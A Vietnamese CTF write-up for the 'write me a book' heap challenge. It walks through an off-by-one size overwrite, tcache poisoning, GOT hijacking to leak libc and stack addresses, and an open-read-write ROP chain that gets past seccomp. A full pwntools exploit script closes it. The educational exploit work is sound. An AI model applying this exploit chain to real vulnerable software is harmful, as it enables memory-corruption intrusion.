# write me a book

## Ý tưởng

- Đây là một chương trình có lỗ hổng heap, tuy nhiên ta không thể double free, hay UAF một cách đơn giản vì các option đều kiểm tra idx đó có hợp lệ không, nhưng có lỗ hổng OVERLAPPING CHUNK và TCACHE POISONING.
- Lý thuyết [OVERLAPPING CHUNK](https://hackmd.io/@-igYKgCkR_aGfvddJjS3QA/SkBZQ6iBn#Khai-th%C3%A1c)
- [TCACHE POISONING](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_poisoning.c)

## Khai thác

### Stage 1: Ow chunk để tạo tcache poisoning.

- Tạo 4 chunk (tại sao phần author-sign ta gửi `sla(b"> ", b"a"*5 + p8(0x41))` tí ta sẽ đề cập )

```python
signature = b"a"*5 + b"\x41"
sla(b"> ", b"a"*5 + p8(0x41))


write(1, b"A"*0x20)
write(2, b"B"*0x1)
write(3, b"C"*0x20)
write(4, b"D"*0x20)
```

- Khi này chunk của chúng ta sẽ trông như này
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/cb962513-9a19-4b10-bb99-12d591888c6e)

- Và ta để ý sau mỗi lần write hay rewrite đều có `*v0 = author_signature;` sau tên sách, và lúc này dòng `v4 = read(0, *((void **)&unk_4040E8 + 2 * v3), *((_QWORD *)&books + 2 * v3));` sẽ tạm hiểu là `read(0,địa chỉ chunk 1, 0x30)` và sau đó nó gắn cái `author_sign` vào nhưng không hề kiểm tra size sau khi gắn author_sign vào nó có còn trong 0x30 byte không, và khi này ta thấy đã bị ow fw_pointer của chunk 2

- Bây giờ rewrite chunk 1 `edit(1, b"a" * 0x30)`, chunk 2 sẽ như này
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/467d6baf-4989-442d-b6d3-74efffb0e98d)
- Chunk 2 đã thay đổi size và cập nhật lại, vì khi nhập 0x30 byte ở chunk 1 + (3 + 6) byte ở author_sign, một byte cuối cùng của author_sign, ghi đè size của chunk 2
- 0x41 byte vì hình như malloc tối đa 0x41 byte thoi
- Leak heap:

```python
def leak(idx: int) -> int:
    sla(b"Option:", b"1337")
    sla(b"What is your favourite number?", str(idx).encode("ascii"))
    p.recvuntil(b"You found a secret message: ")
    leak = int(p.recvuntil(b"\n").replace(b"\n", b"").decode("ascii"), 16)
    return leak
heap_addr = leak(3)

```

- Vậy giờ ta có thể overwrite fw_pointer của chunk 3 sau khi free(UAF)

```python
throw(4)
throw(3)
throw(2)
write(2, b"E"*0x20) #de malloc cap phat 0x41byte

fake_chunk = p64(0) + p64(0x41)  # prev_size, size chunk 3
secret_msg = 0x004040c0
fake_chunk += (p64(secret_msg ^ (heap_addr >> 12)) + #fw_pointer
    p64(0x0))  # next = secret_msg
# fake-chunk replaces chunk C's metadata & next ptr
edit(2, b"E"*0x10 + fake_chunk)
```

- Khi này trong bin sẽ như này `tcahe bin 0x40: chunk3 <== chunk4`, ta sửa fw_pointer của chunk 3, chunk 4 sẽ lấy fw_ptr đó làm địa chỉ nên, trong bin ta sẽ thấy như này
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/feb9b9e6-25fd-41a3-a5d2-d6e87c90471d)

- Khi ta gọi lại 2 chunk 3 4 ra thì chunk 4 đang trỏ địa chỉ của `secret_msg`
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/7519556d-53fa-4cd0-92f4-c9db0e27ebe0)
- Bây giờ ta sẽ set `secret_msg = 0`, author_sign như cũ, size book1 là 0x1000 và địa chỉ book1 là `secret_msg`

```python
fake_book = p64(0x1000) + p64(secret_msg)  # size, ptr
payload = (p64(0) * 2 +  # secret_msg
           b"by " + signature + 7 * b"\x00" +  # author_signature
           fake_book)  # books[0]
edit(4, payload)
```
### Leak libc
- Khi này book 1 là địa chỉ của msg rồi nên bây giờ ta sẽ ghi đè book 2 giữ địa chỉ của free.got, để khi rewrite book 2 thì nó sẽ nhảy vào free.got để ta có thể sửa free.plt thành puts.plt

```python
fake_book2 = p64(0x8) + p64(exe.got["free"])
bss_payload = payload + fake_book2
# writes to secret_msg. book[1] now has ptr=got['free'] & size=0x8
edit(1, bss_payload)

edit(2, p64(exe.plt["puts"]))  # overwrites free with puts
```

```
gef➤  x/30xg 0x00000000004040c0
0x4040c0 <secret_msg>:  0x0000000000000000      0x0000000000000000
0x4040d0 <author_signature>:    0x6161616161207962      0x0000000000000041
0x4040e0 <books>:       0x0000000000001000      0x00000000004040c0      #book1
0x4040f0 <books+16>:    0x0000000000000008      0x0000000000404018      #book2
0x404100 <books+32>:    0x6161616161207962      0x0000000000000041
0x404110 <books+48>:    0x0000000000000030      0x00000000004040c0
0x404120 <books+64>:    0x0000000000000000      0x0000000000000000
```

- Tiếp tục ta ow địa chỉ book 2 là puts.got, vì free() và puts() đều nhận giá trị là một địa chỉ

```python
fake_book2 = p64(0x8) + p64(exe.got["puts"])
bss_payload = payload + fake_book2
edit(1, bss_payload)
throw(2)

libc_leak = u64(p.recvline(keepends=False) + b"\0\0")
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym['puts']
info("libc leak: " + hex(libc.address))
```

```
0x4040e0 <books>:       0x0000000000001000      0x00000000004040c0
0x4040f0 <books+16>:    0x0000000000000008      0x0000000000404030
0x404100 <books+32>:    0x6161616161207962      0x0000000000000041
0x404110 <books+48>:    0x0000000000000030      0x00000000004040c0
0x404120 <books+64>:    0x0000000000000000      0x0000000000000000
```

### Leak stack

- Tương tự như trước, ta sẽ ow free() thành printf() và sử dụng %p để leak stack
- Ow free.plt thành printf.plt

```python
fake_book2 = p64(0x8) + p64(exe.got["free"])
bss_payload = payload + fake_book2
# writes to secret_msg. book[1] now has ptr=got['free'] & size=0x8
edit(1, bss_payload)
edit(2, p64(exe.plt["printf"]))  # overwrite free with puts
```

- Hàm printf() vẫn nhận vào một địa chỉ chứa chuỗi, do đó mình bằng việc rewrite book 1 ta sẽ ghi đè địa chỉ book 2 thành địa chỉ chứa chuỗi, ở đây ta sẽ ow luôn book 3 thành "%8$p\0"

```python
fake_book2 = p64(0x8) + p64(0x404100)  # size=0x8 & ptr=book[2]
bss_payload = payload + fake_book2 + b"%8$p\0"
edit(1, bss_payload)  # writes to secret_msg. book[1] now has ptr=book[2] & size=0x8. book[2] now equals our format string.
throw(2)  # free("hello.%8$p.\0") becomes printf("hello.%8$p.\0")

stack_leak = int(p.recv(14).decode(), 16)
info("stack leak: " + hex(stack_leak))
ret = stack_leak - 24
info("ret: " + hex(ret))
```

```
gef➤  x/s 0x404100
0x404100 <books+32>:    "%8$p."
```

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/75df207d-5e9a-4706-a781-0828a4e71cd4)

### ROP

- Do có seccomp nên không ret2libc, one_gadget cũng có vẽ không được nên ta sẽ mở đọc flag và in ra, ta chỉ cần đưa vào vùng có quyền ghi và đọc là được.

```python
book_start = 0x004040e0

fake_book2 = p64(0x200) + p64(ret)  # size=0x200 & ptr=saved_rip
bss_payload = payload + fake_book2 + b"./flag\0" # dua flag vao rw_section
# writes to secret_msg. book[1] now has ptr=saved_rip & size=0x200. book[2] now equals flag path.
edit(1, bss_payload)
POP_RDI = p64(libc.address + 0x001bc021)
POP_RSI = p64(libc.address + 0x001bb317)
POP_RDX_RBX = p64(libc.address + 0x00175548)
POP_RAX = p64(libc.address + 0x001284f0)
SYSCALL = p64(libc.address + 0x00140ffb)

flag_where = book_start + 0x10 * 10  # buffer to read the flag file into
payload = flat(
    # open("/flag", 0)
    POP_RAX, 2,
    POP_RDI, book_start + 0x10 * 2,
    POP_RSI, 0,
    SYSCALL,

    # read(3, flag_where, 0x50)
    POP_RAX, 0,
    POP_RDI, 3,
    POP_RSI, flag_where,
    POP_RDX_RBX, 0x50, 0,
    SYSCALL,

    # write(1, flag_where, 0x50)
    POP_RAX, 1,
    POP_RDI, 1,
    SYSCALL,
    # 0x0000000000401b88
)
edit(2, payload)
```

## Kết quả

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/a932ac7f-1297-42f4-a490-03dda82df910)

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                # b*0x0000000000401b5b
                # b*0x00000000004016da
                # b*0x000000000040175c
                # b*0x000000000040189d
                # c
                # c
                # c
                # b*0x4016f4
                b*0x0000000000401843
                b*0x0000000000401b2e
                c
                c
                c
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)


def leak(idx: int) -> int:
    sla(b"Option:", b"1337")
    sla(b"What is your favourite number?", str(idx).encode("ascii"))
    p.recvuntil(b"You found a secret message: ")
    leak = int(p.recvuntil(b"\n").replace(b"\n", b"").decode("ascii"), 16)
    return leak


def write(i, payload):
    sla(b"Option: ", b"1")
    sla(b"Index: ", f"{i}".encode())
    sa(b"long!\n", payload)


def throw(i):
    sla(b"Option: ", b"3")
    sla(b"Index: ", f"{i}".encode())


def edit(i, payload):
    sla(b"Option: ", b"2")
    sla(b"Index: ", f"{i}".encode())
    sa(b"before.\n", payload)


GDB()
signature = b"a"*5 + b"\x41"
sla(b"> ", b"a"*5 + p8(0x41))

write(1, b"A"*0x20)
write(2, b"B"*0x1)
write(3, b"C"*0x20)
write(4, b"D"*0x20)
heap_addr = leak(3)
edit(1, b"a" * 0x30)

throw(4)
throw(3)
throw(2)
write(2, b"E"*0x20)

fake_chunk = p64(0) + p64(0x41)  # prev_size, next_size
secret_msg = 0x004040c0
fake_chunk += p64(secret_msg ^ (heap_addr >> 12)) + \
    p64(0x0)  # next = secret_msg
# fake-chunk replaces chunk C's metadata & next ptr
edit(2, b"E"*0x10 + fake_chunk)

write(3, b"F"*0x20)  # re-allocate chunk C
write(4, b"G"*0x20)  # target chunk allocated
fake_book = p64(0x1000) + p64(secret_msg)  # size, ptr
payload = (p64(0) * 2 +  # secret_msg
           b"by " + signature + 7 * b"\x00" +  # author_signature
           fake_book)  # books[0]
edit(4, payload)

#################
### Leak libc ###
#################
fake_book2 = p64(0x8) + p64(exe.got["free"])
bss_payload = payload + fake_book2
# writes to secret_msg. book[1] now has ptr=got['free'] & size=0x8
edit(1, bss_payload)
edit(2, p64(exe.plt["puts"]))  # overwrites free with puts

fake_book2 = p64(0x8) + p64(exe.got["puts"])
bss_payload = payload + fake_book2
edit(1, bss_payload)
throw(2)

libc_leak = u64(p.recvline(keepends=False) + b"\0\0")
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym['puts']
info("libc leak: " + hex(libc.address))

##################
### Leak Stack ###
##################
fake_book2 = p64(0x8) + p64(exe.got["free"])
bss_payload = payload + fake_book2
# writes to secret_msg. book[1] now has ptr=got['free'] & size=0x8
edit(1, bss_payload)
edit(2, p64(exe.plt["printf"]))  # overwrite free with puts

fake_book2 = p64(0x8) + p64(0x404100)  # size=0x8 & ptr=book[2]
bss_payload = payload + fake_book2 + b"%8$p\n\0"
# writes to secret_msg. book[1] now has ptr=book[2] & size=0x8. book[2] now equals our format string.
edit(1, bss_payload)
throw(2)  # free("%8$p\0") becomes printf("%8$p\0")

stack_leak = int(p.recv(14).decode(), 16)
info("stack leak: " + hex(stack_leak))
ret = stack_leak - 24
info("ret: " + hex(ret))

################
##### ROP ######
################
book_start = 0x004040e0
fake_book2 = p64(0x200) + p64(ret)  # size=0x200 & ptr=saved_rip
bss_payload = payload + fake_book2 + b"./flag\0"  # dua flag vao rw_section
# writes to secret_msg. book[1] now has ptr=saved_rip & size=0x200. book[2] now equals flag path.
edit(1, bss_payload)
POP_RDI = p64(libc.address + 0x001bc021)
POP_RSI = p64(libc.address + 0x001bb317)
POP_RDX_RBX = p64(libc.address + 0x00175548)
POP_RAX = p64(libc.address + 0x001284f0)
SYSCALL = p64(libc.address + 0x00140ffb)

flag_where = book_start + 0x10 * 10  # buffer to read the flag file into
payload = flat(
    # open("/flag", 0)
    POP_RAX, 2,
    POP_RDI, book_start + 0x10 * 2,
    POP_RSI, 0,
    SYSCALL,

    # read(3, flag_where, 0x50)
    POP_RAX, 0,
    POP_RDI, 3,
    POP_RSI, flag_where,
    POP_RDX_RBX, 0x50, 0,
    SYSCALL,

    # write(1, flag_where, 0x50)
    POP_RAX, 1,
    POP_RDI, 1,
    SYSCALL,
    # 0x0000000000401b88
)
edit(2, payload)
# sla(b"Option:", b"4")
p.interactive()
```
